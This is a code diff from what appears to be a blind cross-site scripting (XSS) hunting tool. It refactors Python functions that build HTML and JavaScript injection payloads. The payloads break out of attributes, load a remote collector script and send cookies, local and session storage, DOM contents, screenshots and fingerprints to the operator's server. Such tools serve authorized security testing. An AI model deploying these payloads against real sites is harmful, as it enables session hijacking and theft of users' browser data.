@@ -1,6 +1,6 @@
 import base64
 import json
-from typing import Dict, List
+from typing import Dict, Hashable, Iterable, List
 
 from app.api.validators.shared import ValidationException
 from app.models import XSS, Client
@@ -14,30 +14,38 @@ PAYLOADS = {
 }
 
 
-def generate_html_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_html_payload(request_body: Dict, client: Client) -> str:
 
-    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
-        return generate_html_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)
+    if "fingerprint" in request_body["data_to_gather"] or "dom" in request_body["data_to_gather"] or "screenshot" in request_body["data_to_gather"]:
+        return generate_html_payload_with_complex_data(request_body, client)
 
     elif (
-        "local_storage" in data_to_gather
-        or "session_storage" in data_to_gather
-        or "cookies" in data_to_gather
-        or "origin_url" in data_to_gather
-        or "referrer" in data_to_gather
+        "local_storage" in request_body["data_to_gather"]
+        or "session_storage" in request_body["data_to_gather"]
+        or "cookies" in request_body["data_to_gather"]
+        or "origin_url" in request_body["data_to_gather"]
+        or "referrer" in request_body["data_to_gather"]
     ):
-        return generate_html_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)
+        return generate_html_payload_with_simple_data(request_body, client)
 
     else:
-        return generate_html_payload_without_data(tag_list, url, xss_type, client)
+        return generate_html_payload_without_data(request_body, client)
 
 
-def generate_html_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_html_payload_with_complex_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
+    payload_prefix = f'\'>"><script src={request_body["url"]}/static/collector.min.js></script><script>sendData("'
 
     payload_core = base64.b64encode(
-        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
+        str.encode(
+            json.dumps(
+                {
+                    "url": f"{request_body['url']}/api/x/{request_body['xss_type']}/{client.uid}",
+                    "data_to_gather": request_body["data_to_gather"],
+                    "tags": request_body["tags"],
+                }
+            )
+        )
     ).decode()
 
     payload_suffix = '")</script>'
@@ -45,28 +53,28 @@ def generate_html_payload_with_complex_data(data_to_gather: List[str], tag_list:
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_html_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_html_payload_with_simple_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
+    payload_prefix = f'\'>"><script>new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}?'
 
-    if tag_list:
-        tags_parameter = f"tags={','.join(tag_list)}"
-        data_to_gather_parameters = generate_data_to_gather_parameters(data_to_gather)
+    if request_body["tags"]:
+        tags_parameter = f"tags={','.join(request_body['tags'])}"
+        data_to_gather_parameters = generate_data_to_gather_parameters(request_body["data_to_gather"])
         payload_core = "&".join([tags_parameter, data_to_gather_parameters])
     else:
-        payload_core = generate_data_to_gather_parameters(data_to_gather)
+        payload_core = generate_data_to_gather_parameters(request_body["data_to_gather"])
 
     payload_suffix = "</script>"
 
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_html_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_html_payload_without_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
+    payload_prefix = f'\'>"><img src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'
 
-    if tag_list:
-        tags_parameter = f"tags={','.join(tag_list)}"
+    if request_body["tags"]:
+        tags_parameter = f"tags={','.join(request_body['tags'])}"
         payload_core = f"?{tags_parameter}"
     else:
         payload_core = ""
@@ -76,24 +84,32 @@ def generate_html_payload_without_data(tag_list: List[str], url: str, xss_type: 
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_javascript_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_javascript_payload(request_body: Dict, client: Client) -> str:
 
-    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
-        return generate_javascript_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)
+    if "fingerprint" in request_body["data_to_gather"] or "dom" in request_body["data_to_gather"] or "screenshot" in request_body["data_to_gather"]:
+        return generate_javascript_payload_with_complex_data(request_body, client)
 
-    elif not data_to_gather:
-        return generate_javascript_payload_without_data(tag_list, url, xss_type, client)
+    elif not request_body["data_to_gather"]:
+        return generate_javascript_payload_without_data(request_body, client)
 
     else:
-        return generate_javascript_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)
+        return generate_javascript_payload_with_simple_data(request_body, client)
 
 
-def generate_javascript_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_javascript_payload_with_complex_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
+    payload_prefix = f';}};var js=document.createElement("script");js.src="{request_body["url"]}/static/collector.min.js";js.onload=function(){{sendData("'
 
     payload_core = base64.b64encode(
-        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
+        str.encode(
+            json.dumps(
+                {
+                    "url": f"{request_body['url']}/api/x/{request_body['xss_type']}/{client.uid}",
+                    "data_to_gather": request_body["data_to_gather"],
+                    "tags": request_body["tags"],
+                }
+            )
+        )
     ).decode()
 
     payload_suffix = '")};document.body.appendChild(js);'
@@ -101,14 +117,14 @@ def generate_javascript_payload_with_complex_data(data_to_gather: List[str], tag
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_javascript_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_javascript_payload_with_simple_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}'
+    payload_prefix = f';}};new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'
 
-    data_to_gather_parameters = generate_data_to_gather_parameters(data_to_gather)
+    data_to_gather_parameters = generate_data_to_gather_parameters(request_body["data_to_gather"])
 
-    if tag_list:
-        tags_parameter = f"tags={','.join(tag_list)}"
+    if request_body["tags"]:
+        tags_parameter = f"tags={','.join(request_body['tags'])}"
         payload_core = f"?{'&'.join([tags_parameter, data_to_gather_parameters])}"
     else:
         payload_core = f"?{data_to_gather_parameters}"
@@ -118,12 +134,12 @@ def generate_javascript_payload_with_simple_data(data_to_gather: List[str], tag_
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_javascript_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+def generate_javascript_payload_without_data(request_body: Dict, client: Client) -> str:
 
-    payload_prefix = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}'
+    payload_prefix = f';}};new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'
 
-    if tag_list:
-        tags_parameter = f"tags={','.join(tag_list)}"
+    if request_body["tags"]:
+        tags_parameter = f"tags={','.join(request_body['tags'])}"
         payload_core = f"?{tags_parameter}"
     else:
         payload_core = '"'
@@ -133,12 +149,12 @@ def generate_javascript_payload_without_data(tag_list: List[str], url: str, xss_
     return payload_prefix + payload_core + payload_suffix
 
 
-def generate_data_to_gather_parameters(data_to_gather: List[str]) -> str:
+def generate_data_to_gather_parameters(data_to_gather: Iterable[Hashable]) -> str:
 
     return "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')
 
 
-def generate_get_xss_list_filter_expression(query_parameters: dict) -> Dict:
+def generate_get_xss_list_filter_expression(query_parameters: Dict[Hashable, Hashable]) -> Dict[Hashable, Hashable]:
 
     filter_expression = {}
 
@@ -157,7 +173,7 @@ def generate_get_xss_list_filter_expression(query_parameters: dict) -> Dict:
     return filter_expression
 
 
-def generate_get_xss_captured_data_filter_expression(query_parameters: dict) -> Dict:
+def generate_get_xss_captured_data_filter_expression(query_parameters: Dict[Hashable, Hashable]) -> Dict[Hashable, Hashable]:
 
     filter_expression = {}
 
@@ -170,7 +186,7 @@ def generate_get_xss_captured_data_filter_expression(query_parameters: dict) -> 
     return filter_expression
 
 
-def generate_captured_data_list(xss_list: List[XSS]) -> List[dict]:
+def generate_captured_data_list(xss_list: Iterable[XSS]) -> List[Dict]:
 
     captured_data_list = []
 
